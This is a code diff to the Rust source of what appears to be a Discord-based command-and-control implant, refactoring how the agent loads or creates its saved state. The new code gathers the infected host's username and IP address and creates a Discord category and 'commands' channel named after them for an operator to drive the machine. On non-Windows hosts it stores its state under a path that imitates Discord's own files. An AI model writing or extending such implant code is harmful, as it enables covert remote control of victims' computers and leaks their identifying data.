@@ -1,8 +1,11 @@
 use crate::{
+    discord_utils::channels::*,
     errors::DiscordC2Error,
     os::recon::{ip, user},
-    discord_utils::channels::*,
 };
+
+#[cfg(not(windows))]
+use std::fs::create_dir_all;
 
 use std::{
     env, fmt,
@@ -10,14 +13,10 @@ use std::{
     io::{Read, Write},
     path::Path,
 };
-use std::fs::create_dir_all;
 
-use serenity::{
-    client::Context,
-    model::id::ChannelId,
-};
-
+use serenity::{client::Context, model::id::ChannelId};
 use serde::{Deserialize, Serialize};
+use tracing::error;
 
 #[derive(Serialize, Deserialize)]
 pub struct Agent {
@@ -46,10 +45,10 @@ impl Agent {
         Ok(agent)
     }
 
-    pub fn load() -> Result<Agent, DiscordC2Error> {
+    pub fn load() -> Result<Option<Agent>, DiscordC2Error> {
         // Load the file or throw an error
         let mut file = get_config()?;
-        
+
         // Read the contents of the file
         let mut config_data = String::new();
         file.read_to_string(&mut config_data).map_err(|err| {
@@ -57,19 +56,16 @@ impl Agent {
             DiscordC2Error::from(err)
         })?;
 
-        /* fix this */
-
         // if the contents of the agent file is blank, don't bother trying to deserialise because this is
         // the initial agent creation
         if !config_data.is_empty() {
             // Deserialize the JSON data into an Agent object
             let agent = serde_json::from_str(&config_data)
                 .map_err(|err| DiscordC2Error::AgentError(err.to_string()))?;
-            Ok(agent)
+            Ok(Some(agent))
         } else {
-            // just return a blank string instead of erroring on EOF
-            let agent = &config_data;
-            Ok(agent)
+            // Return null, indicating that this is the initial agent creation.
+            Ok(None)
         }
     }
 
@@ -145,9 +141,7 @@ fn get_config() -> Result<File, DiscordC2Error> {
         .write(true)
         .create(true)
         .open(file_path)
-        .map_err( |err| {
-            DiscordC2Error::ConfigError(err.to_string())
-        })?;
+        .map_err(|err| DiscordC2Error::ConfigError(err.to_string()))?;
 
     Ok(file)
 }
@@ -156,48 +150,56 @@ fn get_config() -> Result<File, DiscordC2Error> {
 #[cfg(not(windows))]
 fn get_config() -> Result<File, DiscordC2Error> {
     // let's try to use the user's home directory $HOME/.local/share/discord/config
-    let home_dir = env::var("HOME").map_err(|err|DiscordC2Error::ConfigError(err.to_string()))?;
+    let home_dir = env::var("HOME").map_err(|err| DiscordC2Error::ConfigError(err.to_string()))?;
     let config_dir = Path::new(&home_dir).join(".local/share/discord"); // dir
     let config_file = Path::new(&config_dir).join("config"); // dir + file, so we don't create a dir named config
 
     // if we can't even create the folders, don't try creating the file
-    create_dir_all(&config_dir).map_err(|err|DiscordC2Error::ConfigError(err.to_string()))?;
+    create_dir_all(&config_dir).map_err(|err| DiscordC2Error::ConfigError(err.to_string()))?;
 
     let file = OpenOptions::new()
         .read(true)
         .write(true)
         .create(true)
         .open(&config_file)
-        .map_err( |err| DiscordC2Error::ConfigError(err.to_string()))?;
+        .map_err(|err| DiscordC2Error::ConfigError(err.to_string()))?;
 
     Ok(file)
 }
 
 // Public helper method to either load the agent or create a new one assuming it doesn't exist (or there was an error)
 pub async fn get_or_create_agent(ctx: &Context) -> Agent {
-    match Agent::load() {
-        Ok(agent) => agent,
-        Err(why) => {
-            // Find the hostname/IP of our agent
-            let (hostname, ip) = (user(), ip().await.unwrap());
 
-            // Create the channels
-            let category_id = create_category_channel(ctx, format!("{} - {}", hostname, ip))
-                .await
-                .unwrap(); // TODO: Better error handling
-            let command_id = create_text_channel(
-                ctx,
-                "commands",
-                &category_id,
-                "This is the central command center for your agent. Run some slash commands here!",
-            )
+    async fn create_agent(ctx: &Context) -> Agent{
+        // Find the hostname/IP of our agent
+        let (hostname, ip) = (user(), ip().await.unwrap());
+
+        // Create the channels
+        let category_id = create_category_channel(ctx, format!("{} - {}", hostname, ip))
             .await
             .unwrap(); // TODO: Better error handling
-            println!("Agent created: {}", why);
+        let command_id = create_text_channel(
+            ctx,
+            "commands",
+            &category_id,
+            "This is the central command center for your agent. Run some slash commands here!",
+        )
+        .await
+        .unwrap(); // TODO: Better error handling
 
-            // Instantiate the agent
-            let agent = Agent::new(category_id, command_id, hostname, ip);
-            agent.unwrap()
+        // Instantiate the agent
+        let agent = Agent::new(category_id, command_id, hostname, ip);
+        agent.unwrap()
+    }
+
+    match Agent::load() {
+        Ok(Some(agent)) => agent,
+        Ok(None) => {
+            create_agent(ctx).await
+        }
+        Err(why) => {
+            error!("Error loading agent, so one was created: {}", why);
+            create_agent(ctx).await
         }
     }
 }
